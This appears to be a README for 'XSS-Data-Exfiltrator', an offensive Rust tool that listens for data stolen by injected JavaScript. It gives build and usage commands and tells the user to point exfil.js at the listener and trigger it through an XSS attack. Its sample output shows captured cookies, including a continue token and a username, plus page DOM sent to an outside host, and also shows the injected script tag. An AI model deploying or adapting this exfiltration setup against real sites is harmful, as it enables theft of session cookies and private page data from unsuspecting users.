# XSS-Data-Exfiltrator

Use XSS attacks to exfiltrate useful data!

## How To Compile?
### Using Cargo
```bash
$ git clone https://github.com/whokilleddb/XSS-Data-Exfiltrator
$ cd XSS-Data-Exfiltrator
$ cargo build --release
```

## Usage
### Get Help
```bash
$ ./target/release/exfil --help    
XSS Information Exfiltrator 0.1.0
@whokilleddb
Exfiltrate Data Via XSS

USAGE:
    exfil [OPTIONS]

OPTIONS:
    -h, --help               Print help information
    -o, --output <output>    Name of capture file
    -p, --port <port>        Port To Bind To
    -V, --version            Print version information
```
### Start Listener
```bash
$ ./target/release/exfil       
[+] XSS Exfiltration By @whokilleddb
[+] Logfile: Capture.log
[!] Listening on http://0.0.0.0:6969
```
### Modify `exfil.js`
Update the following Line in `exfil.js`
```js
(Line 1) const url = "http://127.0.0.1:6969/"
```
### Perform XSS To Exfilterate The Data
Perform a XSS attack to trigger the `exfil` function from `exfil.js` and viola! you should have your data ready!

## Sample Output
```bash
$ ./target/release/exfil       
[+] XSS Exfiltration By @whokilleddb
[+] Logfile: Capture.log
[!] Listening on http://0.0.0.0:6969
[+] Fetching Data In A Total Of 6 chunks
[+] Received 1 chunks.
[+] Chunk:
5132397661326c6c4f6770735957356e6457466e5a54316c626a736764325673593239745a574a68626d356c636c397a6447463064584d395a476c7a62576c7a637a73675932397661326c6c59323975633256756446397a644746
[+] Received 2 chunks.
[+] Chunk:
3064584d395a476c7a62576c7a637a73675932397564476c75645756446232526c50575578547a526159564a46516a68524d32396b4d586430596c5277526c4a7061336c315257566d636b70544e5570475248706a536d4656556a
[+] Received 3 chunks.
[+] Chunk:
5a6f4e326f77656d74794e6d4a734d6c5a33554842596554736764584e6c636d3568625755395457463449454a7962336475436c565354446f67436e56755a47566d6157356c5a417045543030675346524e54446f4b5047686c59
[+] Received 4 chunks.
[+] Chunk:
57512b5043396f5a57466b506a78696232523550676f674943416750484e6a636d6c776444356b62324e31625756756443356a62323972615755675053416964584e6c636d3568625755395457463449454a7962336475496a7338
[+] Received 5 chunks.
[+] Chunk:
4c334e6a636d6c776444344b494341674944787a59334a706348516763334a6a50534a6f644852774f6938764d5449334c6a41754d4334784c3256345a6d6c734c6d707a496a34384c334e6a636d6c77644434384c324a765a486b
[+] Received 6 chunks.
[+] Chunk:
2b
Payload = 5132397661326c6c4f6770735957356e6457466e5a54316c626a736764325673593239745a574a68626d356c636c397a6447463064584d395a476c7a62576c7a637a73675932397661326c6c59323975633256756446397a6447463064584d395a476c7a62576c7a637a73675932397564476c75645756446232526c50575578547a526159564a46516a68524d32396b4d586430596c5277526c4a7061336c315257566d636b70544e5570475248706a536d4656556a5a6f4e326f77656d74794e6d4a734d6c5a33554842596554736764584e6c636d3568625755395457463449454a7962336475436c565354446f67436e56755a47566d6157356c5a417045543030675346524e54446f4b5047686c5957512b5043396f5a57466b506a78696232523550676f674943416750484e6a636d6c776444356b62324e31625756756443356a62323972615755675053416964584e6c636d3568625755395457463449454a7962336475496a73384c334e6a636d6c776444344b494341674944787a59334a706348516763334a6a50534a6f644852774f6938764d5449334c6a41754d4334784c3256345a6d6c734c6d707a496a34384c334e6a636d6c77644434384c324a765a486b2b
-----------------
[+] Writing Data To: Encoded-Capture.log
[+] Encoded Payload Successfully Written To: Encoded-Capture.log
[+] Decoded Payload: 
Cookie:
language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=e1O4ZaREB8Q3od1wtbTpFRikyuEefrJS5JFDzcJaUR6h7j0zkr6bl2VwPpXy; username=Max Brown
URL: 
undefined
DOM HTML:
<head></head><body>
    <script>document.cookie = "username=Max Brown";</script>
    <script src="http://127.0.0.1/exfil.js"></script></body>
[+] Writing Data To: Decoded-Capture.log
[+] Encoded Payload Successfully Written To: Decoded-Capture.log
[+] Exiting 🏳️
```
